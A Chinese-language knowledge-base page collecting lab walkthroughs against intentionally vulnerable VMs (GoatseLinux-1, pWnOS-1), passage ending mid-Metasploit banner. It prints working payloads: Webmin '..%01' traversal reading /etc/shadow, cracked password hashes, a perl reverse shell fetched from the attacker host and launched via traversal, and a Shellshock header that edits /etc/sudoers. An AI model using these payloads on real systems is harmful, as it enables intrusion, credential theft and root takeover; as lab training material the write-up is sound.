---
title: 中间件请求解析与管理接口
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/middleware/
categories:
- Web安全
- 服务端组件
tags:
- 知识库
- Webmin
- SSH
- 文件读取
- 内核
- 路径穿越
- Nostromo
- GTFOBins
- distcc
- Drupal
description: 本章收录 Webmin、Usermin、Nostromo、distcc 等原服务环境。记录包含服务版本、协议输入、文件映射和本地身份，使同名漏洞与具体部署条件能够对应。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

本章收录 Webmin、Usermin、Nostromo、distcc 等原服务环境。记录包含服务版本、协议输入、文件映射和本地身份，使同名漏洞与具体部署条件能够对应。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/middleware/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

pWnOS 与 GoatseLinux 的管理接口保留文件读取和替代认证路径。

Traverxec 的 Nostromo 请求与用户目录映射连接到 journalctl/less。

VulnOS-1 的 distcc、Drupal、Webmin 和数据库入口分别留有实验记录。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [Webmin 文件读取与旧内核分支](#case-goatselinux-1) | GoatseLinux-1 | Webmin、文件读取、内核 |
| [Webmin 读取与多条服务入口](#case-pwnos-1) | pWnOS-1 | Webmin、路径穿越、SSH |
| [Nostromo 映射与日志查看器](#case-traverxec) | Traverxec | Nostromo、SSH、GTFOBins |
| [distcc 与多个管理入口](#case-vulnos-1) | vulnos-1 | distcc、Webmin、Drupal |

<a id="case-goatselinux-1"></a>

## Webmin 文件读取与旧内核分支

原环境同时暴露 Webmin、旧内核及多个服务，记录保留已经验证的文件读取、口令恢复和本地提权尝试。失败分支继续标记为原文观察。

<p class="kb-provenance">来源 GoatseLinux-1 · 原记录 2019-12-18 · 9 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-goatselinux-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start GoatseLinux-1 -->

名称：GoatseLinux: 1
发布日期：2009年6月27日

下载：

 - Download: [http://neutronstar.org/tmp/GoatseLinux_1.0_VM.rar](http://neutronstar.org/tmp/GoatseLinux_1.0_VM.rar)
 - Download (Mirror): [https://download.vulnhub.com/goatselinux/GoatseLinux_1.0_VM.rar](https://download.vulnhub.com/goatselinux/GoatseLinux_1.0_VM.rar)
 - Download (Torrent): [https://download.vulnhub.com/goatselinux/GoatseLinux_1.0_VM.rar.torrent](https://download.vulnhub.com/goatselinux/GoatseLinux_1.0_VM.rar.torrent)

描述：

GoatseLinux v1.0 Pentest实验室虚拟机
史蒂夫·波顿
2009.06.27
在gnu许可下广泛分发。
这是专门为VMware 6.5兼容性而构建的。
警告：GoatseLinux是不安全的。 它被设计为用于进行渗透测试的实验室工具箱。 由于几乎所有安装的程序都具有广泛的开放性，因此强烈建议您不要将VM网络设置为除“基于主机”之外的任何方式，除非您喜欢将VM用作僵尸垃圾邮件箱。
笔记：
建立在Slax 5.0.7版本上。
资料来源：readme.txt



#### 信息收集

nmap伺候

``` bash
root@kali:~# nmap -sn -v 192.168.142.0/24
Nmap scan report for 192.168.142.132
Host is up (0.00015s latency).
MAC Address: 00:0C:29:0A:54:68 (VMware)
```

``` bash
root@kali:~# nmap -sV -Pn -p- -v 192.168.142.132
PORT      STATE SERVICE VERSION
21/tcp    open  ftp
22/tcp    open  ssh     OpenSSH 3.5p1 (protocol 1.99)
25/tcp    open  smtp    Sendmail
53/tcp    open  domain  ISC BIND 8.2.2-REL
80/tcp    open  http    Apache httpd 1.3.31 ((Unix))
587/tcp   open  smtp    Sendmail
631/tcp   open  ipp     CUPS 1.1
3306/tcp  open  mysql   MySQL (unauthorized)
10000/tcp open  http    MiniServ 0.01 (Webmin httpd)
```

发现:

http://192.168.142.132/
![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub68.jpg)

http://192.168.142.132/goatse.html
![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub69.jpg)

http://192.168.142.132:10000/
![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub70.jpg)

是基于Web的系统管理工具Webmin。Metasploit提供了三种漏洞利用:一个用于shell，两个用于获取任意文件的辅助模块。

msf伺候

``` bash
root@kali:~# msfdb run
[+] Starting database
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----                                                   
                            /  ,' `-._<.===-'                                                          
                           /  /                                                                        
                          /  ;                                                                         
              _          /   ;                                                                         
 (`._    _.-"" ""--..__,'    |                                                                         
 <_  `-""                     \                                                                        
  <`-                          :                                                                       
   (__   <__.                  ;                                                                       
     `-.   '-.__.      _.'    /                                                                        
        \      `-.__,-'    _,'                                                                         
         `._    ,    /__,-'                                                                            
            ""._\__,'< <____                                                                           
                 | |  `----.`.                                                                         
                 | |        \ `.                                                                       
                 ; |___      \-``                                                                      
                 \   --<                                                                               
                  `.`.<                                                                                
                    `-'                                                                                
                                                                                                       
                                                                                                       

       =[ metasploit v5.0.64-dev                          ]
+ -- --=[ 1952 exploits - 1092 auxiliary - 335 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use auxiliary/admin/webmin/file_disclosure
msf5 auxiliary(admin/webmin/file_disclosure) > set RHOST 192.168.142.132
RHOST => 192.168.142.132
msf5 auxiliary(admin/webmin/file_disclosure) > exploit
[*] Running module against 192.168.142.132

[*] Attempting to retrieve /etc/passwd...
[*] The server returned: 200 Document follows
root:x:0:0::/root:/bin/bash
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
adm:x:3:4:adm:/var/log:
lp:x:4:7:lp:/var/spool/lpd:
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/:
news:x:9:13:news:/usr/lib/news:
uucp:x:10:14:uucp:/var/spool/uucppublic:
operator:x:11:0:operator:/root:/bin/bash
games:x:12:100:games:/usr/games:
ftp:x:14:50::/var/ftp:
smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
rpc:x:32:32:RPC portmap user:/:/bin/false
sshd:x:33:33:sshd:/:
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
pop:x:90:90:POP:/:
nobody:x:99:99:nobody:/:
guest:x:1000:100::/home/guest:/bin/bash
goatse:x:1002:10:,,,:/home/goatse:/bin/bash
jpelman:x:1003:100:,,,:/home/jpelman:/bin/bash
jblow:x:1004:100:,,,:/home/jblow:/bin/bash
[*] Auxiliary module execution completed
msf5 auxiliary(admin/webmin/file_disclosure) > set RPATH /etc/shadow
RPATH => /etc/shadow
msf5 auxiliary(admin/webmin/file_disclosure) > exploit
[*] Running module against 192.168.142.132

[*] Attempting to retrieve /etc/shadow...
[*] The server returned: 200 Document follows
root:$1$k6V/lmUF$n2iBfemYg/IsVRyjqopr3.:14422:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
smmsp:*:9797:0:::::
mysql:*:9797:0:::::
rpc:*:9797:0:::::
sshd:*:9797:0:::::
gdm:*:9797:0:::::
pop:*:9797:0:::::
nobody:*:9797:0:::::
guest:$1$T7.0qXyH$hC4dje14rIUFJXbZUCkdB/:12876:0:99999:7:::
goatse:$1$lXWz2SF8$sr5ux2i3UpMAf30t5uMtT0:14422:0:99999:7:::
jpelman:$1$3nO0QVVF$Iy21QTWTrHPd5/6ZrAvrj.:14422:0:99999:7:::
jblow:$1$35A0vqVF$MoYgZm/DxNS5nBZZk3Y2R1:14422:0:99999:7:::
[*] Auxiliary module execution completed
```

将/etc/shadow保存为.txt文件然后使用john破解密码的hash,左边是密码，右边是用户名。

``` bash
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt /root/goastshadow
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bobby            (jpelman)
kokomo           (jblow)
guest            (guest)
gaping           (goatse)
4g 0:00:00:49 DONE (2019-12-18 21:35) 0.08014g/s 282509p/s 320894c/s 320894C/s !!!0mc3t..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

使用其中一个用户goatse登录

``` bash
root@kali:~# ssh goatse@192.168.142.132
The authenticity of host '192.168.142.132 (192.168.142.132)' can't be established.
RSA key fingerprint is SHA256:25uPigwKnzugpFkHd91FCdBukcikll8dkH4oV7OQROY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.142.132' (RSA) to the list of known hosts.
goatse@192.168.142.132's password: 
Linux 2.6.15.
goatse@slax:~$ id
uid=1002(goatse) gid=10(wheel) groups=10(wheel)
goatse@slax:~$ whoami
goatse
goatse@slax:~$ pwd
/home/goatse
goatse@slax:~$
```

#### 提权1

``` bash
goatse@slax:~$ uname -a
Linux slax 2.6.15 #1 SMP Tue Jan 10 07:53:57 GMT 2006 i686 unknown unknown GNU/Linux
goatse@slax:~$ sudo -s
Password:
root@slax:~# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
root@slax:~# whoami
root
```

#### 提权2

另一个方法通过使用旧内核,prctl权限提升漏洞。
exp下载，[BIND](https://www.exploit-db.com/download/282)

kali端

``` bash
root@kali:~# python -m SimpleHTTPServer
```

shell端

``` bash
goatse@slax:~$ wget http://192.168.142.128:8000/282.c
--20:16:25--  http://192.168.142.128:8000/282.c
           => `282.c'
Connecting to 192.168.142.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16,429 (16K) [text/plain]

100%[===========================================================>] 16,429        --.--K/s             

20:16:25 (290.15 MB/s) - `282.c' saved [16429/16429]
```

编译并运行

``` bash
goatse@slax:~$ gcc 282.c -o bind
282.c:565:28: warning: no newline at end of file
goatse@slax:~$ ls
282.c*  bind*  test.sh*
oatse@slax:~$ ./bind 127.0.0.1
[*] named 8.2.x (< 8.2.3-REL) remote root exploit by lucysoft, Ix
[*] fixed by ian@cypherpunks.ca and jwilkins@bitland.net

[*] attacking 127.0.0.1 (127.0.0.1)
[d] HEADER is 12 long
[d] infoleak_qry was 476 long
[*] iquery resp len = 719
[d] argevdisp1 = 080d7cd0, argevdisp2 = b7daea64
[*] retrieved stack offset = bfc2a8f8
[d] evil_query(buff, bfc2a8f8)
[d] shellcode is 134 long
[d] olb = 248
[x] could not write our data in buffer (offset0=56, rroffsetidx=4)
[x] error sending tsig packet
```

不知为什么一直运行失败，此SSH上还有一个root漏洞利用。 还有Apache的权限提升。 以及CUPS中的多个远程Shell漏洞。 这是一个旧漏洞的游乐场。 Metasploitable具有更多易受攻击的服务（以及Metasploitable 2），如果您正在寻找这样的游乐场，建议选择Goatsie上的那些。


<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>


<!-- kb:end GoatseLinux-1 -->

</details>

<a id="case-pwnos-1"></a>

## Webmin 读取与多条服务入口

Webmin 与 Usermin 的路径处理提供文件读取，原文同时记录口令、SSH、CGI 和本地提权路径，并保留各自响应。

<p class="kb-provenance">来源 pWnOS-1 · 原记录 2019-12-29 · 27 个代码块 · 3 处图片引用</p>

<details class="kb-evidence" id="record-pwnos-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start pWnOS-1 -->

#### 发布日期
名称：pWnOS: 1.0
发布日期：2008年6月27日


#### Readme.txt
感谢您尝试使用pWnOS 1.0。开始之前需要注意的几件事。 pWnOS是使用VMware Workstation制作的，可以通过下载VMware Server或Vmware Player来启动...两者都是免费的！或免费的VMware Workstation（Windows）或VMware Fusion（OS X）。

1.如果Vmware在首次引导时询问您是复制还是移动了该虚拟机，请单击MOVED！否则，网络设置可能会混乱。
2.当前已将虚拟机设置为使用桥接网络，但是您可能希望根据自己的喜好将其更改为NAT或“仅主机”。
3.可以在milw0rm.com上找到所有必需的工具/漏洞/所有内容。
4.有多种途径可以访问外壳。我创建了一个n00b路径和一个更高级的路径。看看是否可以同时获得它们！
我将pWnOS的难度评定为与De-Ice的2级磁盘大致相同...可能要困难一些。有关De-Ice渗透测试磁盘的信息，请参见http://www.de-ice.net。
我希望你喜欢它！如果您有任何疑问或反馈，请给我发送电子邮件至bond00@gmail.com
bond00



#### 下载

 - Download: http://pwnos.com/files/pWnOS_v1.0.zip
 - Download (Mirror): https://download.vulnhub.com/pwnos/pWnOS_v1.0.zip
 - Download (Torrent): https://download.vulnhub.com/pwnos/pWnOS_v1.0.zip.torrent

#### 描述

你们中有些人可能已经注意到了这个新的pWnOS论坛部分。 我创建了pWnOS作为虚拟机，而Grendel很好，我可以在这里发布它。 这是有关pWnOS的一些信息。
这是一个有意配置有可利用服务的linux虚拟机，可为您提供通往r00t的路径。 :)当前，虚拟机NIC是在桥接网络中配置的，因此它将在您连接到的网络上获得一个正常的IP地址。 您可以根据需要轻松地将其更改为NAT或仅主机。 快速ping扫描将显示虚拟机的IP地址。
对不起...没有任何场景/故事情节。 我并不是真的打算这样发布它，所以也许对于2.0版，我会更具创造力。 :)我很想得到反馈，所以请告诉我它的进展或您有任何疑问。 谢谢，祝你好运！
资料来源：http://forums.hackingdojo.com/viewtopic.php?f=21&t=149

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.33.0/24
Nmap scan report for localhost (192.168.33.3)
Host is up (0.00020s latency).
MAC Address: 00:0C:29:5E:18:C9 (VMware)
```

``` bash
root@kali:~# nmap -sT -Pn -n -vv 192.168.33.3 -p- -sC --script=vuln
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http             syn-ack
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6'
|   /index/: Potentially interesting folder
|_  /php/: Potentially interesting directory w/ listing on 'apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6'
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-trace: TRACE is enabled
| Headers:
| Date: Sun, 29 Dec 2019 08:21:03 GMT
| Server: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
| Connection: close
| Transfer-Encoding: chunked
|_Content-Type: message/http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
139/tcp   open  netbios-ssn      syn-ack
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds     syn-ack
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
10000/tcp open  snet-sensor-mgmt syn-ack
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.exploit-db.com/exploits/1997/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
```

上dirb

``` bash
root@kali:~# dirb http://192.168.33.3/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Dec 31 02:00:48 2019
URL_BASE: http://192.168.33.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.33.3/ ----
+ http://192.168.33.3/cgi-bin/ (CODE:403|SIZE:306)                                                    
+ http://192.168.33.3/index (CODE:200|SIZE:295)                                                       
+ http://192.168.33.3/index.php (CODE:200|SIZE:295)                                                   
+ http://192.168.33.3/index1 (CODE:200|SIZE:1104)                                                     
+ http://192.168.33.3/index2 (CODE:200|SIZE:156)                                                      
==> DIRECTORY: http://192.168.33.3/php/
```

/php目录有一个phpmyadmin，但是需要密码，除此之外没有太多可用的信息。

构造如下poc，观察返回结果

``` bash
http://192.168.33.3/index1.php?help=true&connect=/etc/passwd
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub119.jpg)

说明存在本地文件包含漏洞LFI

``` bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh dhcp:x:100:101::/nonexistent:/bin/false syslog:x:101:102::/home/syslog:/bin/false klog:x:102:103::/home/klog:/bin/false mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash obama:x:1001:1001::/home/obama:/bin/bash osama:x:1002:1002::/home/osama:/bin/bash yomama:x:1003:1003::/home/yomama:/bin/bash 
```

#### 转向10000端口的webmin

本来可以使用[webminperl脚本](https://www.exploit-db.com/exploits/2017)，但是现在尝试下手工构造poc。。。
注意使..%01/..%01/..%01/..%01/..%01/..%01/尽量长一些。。。

``` bash
http://192.168.33.3:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
```
![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub120.jpg)

成功读取/etc/shadow文件，尝试解密root账号的hash值，但是密码太复杂，解不出来。。。只能使用下面的方法然后老老实实提权。

#### john破解hash值

将下面的hash串保存成shadow.txt，然后使用john破解。

``` bash
root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.
```

``` bash
root@kali:~# john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
h4ckm3           (vmware)
1g 0:00:03:57 DONE (2019-12-31 03:46) 0.004212g/s 59396p/s 269590c/s 269590C/s !!!0mc3t..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# john --show shadow.txt 
vmware:h4ckm3

1 password hash cracked, 4 left
```
得到用户名和密码：vmware/h4ckm3


#### getshell

``` bash
root@kali:~# ssh vmware@192.168.33.3
The authenticity of host '192.168.33.3 (192.168.33.3)' can't be established.
RSA key fingerprint is SHA256:+C7UA7dQ1B/8zVWHRBD7KeNNfjuSBrtQBMZGd6qoR9w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.33.3' (RSA) to the list of known hosts.
vmware@192.168.33.3's password: 
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
Last login: Fri Jun 20 14:35:37 2008
vmware@ubuntuvm:~$ id
uid=1000(vmware) gid=1000(vmware) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)
vmware@ubuntuvm:~$ whoami
vmware
```

#### 提权

phpmyadmin里面的config.inc.php文件没有发现任何有价值的密码

``` bash
$cfg['Servers'][$i]['host']          = 'localhost'; // MySQL hostname or IP address
$cfg['Servers'][$i]['port']          = '';          // MySQL port - leave blank for default port
$cfg['Servers'][$i]['socket']        = '';          // Path to the socket - leave blank for default socket
$cfg['Servers'][$i]['connect_type']  = 'tcp';       // How to connect to MySQL server ('tcp' or 'socket')
$cfg['Servers'][$i]['extension']     = 'mysql';     // The php MySQL extension to use ('mysql' or 'mysqli')
$cfg['Servers'][$i]['compress']      = FALSE;       // Use compressed protocol for the MySQL connection
                                                    // (requires PHP >= 4.3.0)
$cfg['Servers'][$i]['controluser']   = '';          // MySQL control user settings
                                                    // (this user must have read-only
$cfg['Servers'][$i]['controlpass']   = '';          // access to the "mysql/user"
                                                    // and "mysql/db" tables).
                                                    // The controluser is also
                                                    // used for all relational
                                                    // features (pmadb)
$cfg['Servers'][$i]['auth_type']     = 'http';    // Authentication method (config, http or cookie based)?
$cfg['Servers'][$i]['user']          = 'root';      // MySQL user
$cfg['Servers'][$i]['password']      = '';          // MySQL password (only needed
```

``` bash
vmware@ubuntuvm:/var$ ls -lah
total 52K
drwxr-xr-x 15 root root  4.0K 2008-06-10 13:28 .
drwxr-xr-x 21 root root  4.0K 2008-06-10 06:37 ..
drwxr-xr-x  2 root root  4.0K 2008-06-10 06:28 backups
drwxr-xr-x  9 root root  4.0K 2008-06-10 07:07 cache
drwxr-xr-x 23 root root  4.0K 2008-06-10 07:08 lib
drwxrwsr-x  2 root staff 4.0K 2007-10-08 05:47 local
drwxrwxrwt  3 root root    60 2019-12-31 00:24 lock
drwxr-xr-x 11 root root  4.0K 2019-12-31 00:24 log
drwxrwsr-x  2 root mail  4.0K 2008-06-10 06:24 mail
drwxr-xr-x  2 root root  4.0K 2008-06-10 06:24 opt
drwxr-xr-x 11 root root   400 2019-12-31 02:58 run
drwxr-xr-x  5 root root  4.0K 2008-06-10 07:07 spool
drwxrwxrwt  2 root root  4.0K 2007-10-08 05:47 tmp
drwx------  2 root bin   4.0K 2008-06-10 13:31 webmin
drwxr-xr-x  3 root root  4.0K 2008-06-12 09:55 www
```

知道Webmin以root身份运行，只需要找到一个可以写的位置并使用文件包含来调用该文件。 回顾Webmin上的源代码，注意到它正在使用.CGI。 经过研究，发现[.CGI](https://users.cs.cf.ac.uk/Dave.Marshall/PERL/node188.html#SECTION002012000000000000000)使用[perl]（perl，C＃或unix脚本。因此，到/usr/share/webshells/perl目录，复制了perl reverse shell，将ip和端口更改为443， 以及从pl到.cgi的扩展名。使用wget将其发送到Web服务器。

先leafpad将perl-reverse-shell.pl的ip改成kali的ip,端口改成443

``` bash
root@kali:/usr/share/webshells/perl# cp perl-reverse-shell.pl mine.cgi
root@kali:/usr/share/webshells/perl# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

shell中

``` bash
vmware@ubuntuvm:~$ wget http://192.168.33.1:8000/mine.cgi
--03:44:12--  http://192.168.33.1:8000/mine.cgi
           => `mine.cgi'
Connecting to 192.168.33.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3,714 (3.6K) [application/octet-stream]

100%[===========================================================>] 3,714         --.--K/s             

03:44:12 (852.45 MB/s) - `mine.cgi' saved [3714/3714]

vmware@ubuntuvm:~$ chmod 777 *
vmware@ubuntuvm:~$ ls
mine.cgi
```

浏览器中执行poc,稍等片刻即可返回root的shell

``` bash
http://192.168.33.3:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/mine.cgi
```

``` bash
root@kali:~# nc -lvp 443
listening on [any] 443 ...
192.168.33.3: inverse host lookup failed: Unknown host
connect to [192.168.33.1] from (UNKNOWN) [192.168.33.3] 37512
 03:49:32 up  3:24,  1 user,  load average: 0.01, 0.09, 0.06
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
vmware   pts/0    192.168.33.1     03:47   13.00s  0.03s  0.03s -bash
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
uid=0(root) gid=0(root)
/
/usr/sbin/apache: can't access tty; job control turned off
# id
uid=0(root) gid=0(root)
# whoami
root
# cd /root
# ls
keys
# cat keys
cat: keys: Is a directory
# cd keys
# ls
# ls -la
total 8
drwxr-xr-x 2 root root 4096 Jun 12  2008 .
drwxr-xr-x 4 root root 4096 Jun 12  2008 ..
# cd ..
# ls
keys
```

到此为止，提权完成。

#### 提权2

查看是否存在shellshock漏洞

``` bash
vmware@ubuntuvm:~$ env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c date
CVE-2014-6271 vulnerable
Tue Dec 31 06:59:03 CST 2019
```

创建bash脚本并命名为hello.cgi，并放到目标shell中

``` bash
#!/bin/bash
print "Content-type: text/HMTL\n\n";
print "<HTML>\n";
print "<head><title>HEllo World!</title></head>\n";
print "<BODY>\n";
print "<h2>Hello World!</h2>\n";
```

``` bash
vmware@ubuntuvm:/tmp$ wget http://192.168.33.1:8000/hello.cgi
--08:40:16--  http://192.168.33.1:8000/hello.cgi
           => `hello.cgi'
Connecting to 192.168.33.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 169 [application/octet-stream]

100%[==============================================================>] 169           --.--K/s             

08:40:16 (70.88 MB/s) - `hello.cgi' saved [169/169]
```

构造下面的poc浏览器访问,并burp抓包，如下将请求包改包,然后发包

``` bash
http://192.168.33.3:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/hello.cgi
```

``` bash
GET /unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/hello.cgi HTTP/1.1
Host: 192.168.33.3:10000
User-Agent: () { :; };/bin/echo "vmware ALL=(ALL) ALL">>/etc/sudoers
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: testing=1
Upgrade-Insecure-Requests: 1
```

关键是删去原有的User-Agent的内容，然后加上：

``` bash
() { :; };/bin/echo "vmware ALL=(ALL) ALL">>/etc/sudoers
```

即可将vmware用户添加到超级用户组

``` bash
vmware@ubuntuvm:/tmp$ sudo su
root@ubuntuvm:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntuvm:/tmp# whoami
root
```

再次成功提权。

#### other way to get shell and privilege escalate by using msf

Webmin和Usermin中已经报告了一个漏洞，恶意人员可以利用此漏洞来披露潜在的敏感信息。 该漏洞是由于URL处理中的未指定错误引起的。 可以利用此漏洞通过特制的URL读取服务器上任何文件的内容，而无需有效的登录。 已在Webmin（1.290之前的版本）和Usermin（1.220之前的版本）中报告了此漏洞。

使用msf

``` bash
root@kali:~# msfdb run
[+] Starting database
                                                  

         .                                         .                                                      
 .                                                                                                        
                                                                                                          
      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o                                         
       '   dB'                     BBP                                                                    
    dB'dB'dB' dBBP     dBP     dBP BB                                                                     
   dB'dB'dB' dBP      dBP     dBP  BB                                                                     
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB                                                                     
                                                                                                          
